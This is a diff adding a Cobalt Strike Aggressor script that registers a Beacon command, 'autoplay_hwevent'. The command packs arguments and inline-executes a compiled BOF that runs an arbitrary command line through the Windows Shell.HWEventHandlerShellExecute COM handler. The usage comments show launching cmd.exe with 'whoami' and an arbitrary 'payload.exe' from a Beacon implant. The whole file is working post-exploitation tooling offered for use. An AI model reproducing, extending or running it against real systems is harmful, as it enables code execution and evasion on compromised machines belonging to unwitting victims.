@@ -1,0 +1,41 @@
+# Aggressor loader for AutoPlay-HWEventHandler-BOF.
+#
+# Usage from Beacon:
+#   autoplay_hwevent "C:\Windows\System32\notepad.exe"
+#   autoplay_hwevent "C:\Windows\System32\cmd.exe /c whoami > %TEMP%\hw.txt"
+#   autoplay_hwevent "C:\Path\payload.exe arg1 arg2" "DeviceArrival" "BOFDevice"
+
+beacon_command_register(
+    "autoplay_hwevent",
+    "ShellHWEventExec: fire a command through Shell.HWEventHandlerShellExecute",
+    "Usage: autoplay_hwevent \"<cmdline>\" [event] [device]\n" .
+    "\troute\t: COM -> IHWEventHandler::Initialize -> HandleEvent\n" .
+    "\tevent\t: DeviceArrival\n" .
+    "\tdevice\t: BOFDevice\n"
+);
+
+alias autoplay_hwevent {
+    local('$bid $cmd $event $device $packed $bof');
+    $bid = $1;
+
+    if (size(@_) < 2) {
+        berror($bid, "ShellHWEventExec: autoplay_hwevent \"<cmdline>\" [event] [device]");
+        return;
+    }
+
+    $cmd = $2;
+    $event = "DeviceArrival";
+    $device = "BOFDevice";
+
+    if (size(@_) >= 3) {
+        $event = $3;
+    }
+
+    if (size(@_) >= 4) {
+        $device = $4;
+    }
+
+    $bof = script_resource("compiled/autoplay_hwevent_bof.x64.o");
+    $packed = bof_pack($bid, "zzz", $cmd, $event, $device);
+    beacon_inline_execute($bid, $bof, "go", $packed);
+}
